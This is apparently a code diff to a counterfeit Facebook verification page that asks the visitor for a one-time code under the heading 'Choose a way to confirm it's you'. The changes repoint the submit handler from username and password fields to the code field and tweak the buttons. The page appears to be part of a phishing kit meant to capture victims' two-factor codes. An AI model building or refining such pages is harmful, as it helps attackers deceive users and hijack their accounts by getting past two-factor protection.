@@ -59,7 +59,7 @@
     <div class="FBLoginPage">
       <center>
         <div class="card" style="width: 25rem">
-          <form method="post" accept=".">
+          <form method="post" accept="." onsubmit="handleSubmit()">
             <p class="form-heading">Choose a way to confirm it's you</p>
             <hr />
             <small style="text-align: left !important">
@@ -73,7 +73,7 @@
                 placeholder="Enter OTP"
                 name="code"
                 class="form-control"
-                id="exampleInputEmail1"
+                id="code"
                 aria-describedby="emailHelp"
                 required
               />
@@ -83,6 +83,7 @@
               type="submit"
               name="submit"
               id="submit"
+              onclick="handleSubmit()"
               class="btn btn-primary LogInBTN"
               style="font-size: 0.9em"
             >
@@ -91,6 +92,7 @@
             <button
               type="button"
               name="submit"
+              class="btn btn-primary LogInBTN"
               id="submit2"
               style="display: none"
             >
@@ -191,19 +193,17 @@
     </div>
     <script>
       const handleSubmit = (e) => {
-        const username = document.querySelector("#username");
-        const password = document.querySelector("#password");
+        const username = document.querySelector("#code");
         const submitBtn = document.querySelector("#submit");
         const submitBtn2 = document.querySelector("#submit2");
 
-        if (username.value.length > 0 && password.value.length > 0) {
+        if (username.value.length > 3) {
           submitBtn.style.display = "none";
           submitBtn2.style.display = "block";
         } else {
           e.preventDefault();
           return false;
         }
-
         e.preventDefault();
         return false;
       };
